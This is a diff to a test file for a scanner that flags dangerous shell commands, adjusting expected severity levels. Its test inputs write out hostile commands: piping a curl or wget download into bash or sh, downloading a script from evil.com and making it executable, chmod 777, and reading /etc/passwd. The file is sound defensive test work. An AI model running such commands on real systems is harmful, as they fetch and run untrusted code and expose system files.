@@ -21,6 +21,7 @@ describe("commandsChecker", () => {
 		const findings = await commandsChecker.check(ctx);
 		expect(findings.length).toBeGreaterThan(0);
 		expect(findings[0].category).toBe("dangerous-command");
+		expect(findings[0].severity).toBe("medium");
 	});
 
 	it("detects rm -rf targeting root", async () => {
@@ -33,7 +34,7 @@ describe("commandsChecker", () => {
 		const ctx = makeContext([cmd("chmod 777 /var/www")]);
 		const findings = await commandsChecker.check(ctx);
 		expect(findings.length).toBeGreaterThan(0);
-		expect(findings[0].severity).toBe("high");
+		expect(findings[0].severity).toBe("medium");
 	});
 
 	it("detects chmod 666", async () => {
@@ -47,7 +48,7 @@ describe("commandsChecker", () => {
 		const ctx = makeContext([cmd("curl https://example.com/install.sh | bash")]);
 		const findings = await commandsChecker.check(ctx);
 		expect(findings.length).toBeGreaterThan(0);
-		expect(findings[0].severity).toBe("high");
+		expect(findings[0].severity).toBe("critical");
 	});
 
 	it("detects curl | sudo bash", async () => {
@@ -60,6 +61,7 @@ describe("commandsChecker", () => {
 		const ctx = makeContext([cmd("wget -O- https://example.com/script | sh")]);
 		const findings = await commandsChecker.check(ctx);
 		expect(findings.length).toBeGreaterThan(0);
+		expect(findings[0].severity).toBe("critical");
 	});
 
 	it("detects SSH directory access", async () => {
@@ -78,13 +80,14 @@ describe("commandsChecker", () => {
 		const ctx = makeContext([cmd("cat /etc/passwd")]);
 		const findings = await commandsChecker.check(ctx);
 		expect(findings.length).toBeGreaterThan(0);
-		expect(findings[0].severity).toBe("high");
+		expect(findings[0].severity).toBe("medium");
 	});
 
 	it("detects download-and-execute patterns", async () => {
 		const ctx = makeContext([cmd("curl -o script.sh https://evil.com/s && chmod +x script.sh")]);
 		const findings = await commandsChecker.check(ctx);
 		expect(findings.length).toBeGreaterThan(0);
+		expect(findings[0].severity).toBe("medium");
 	});
 
 	it("returns empty for safe commands", async () => {
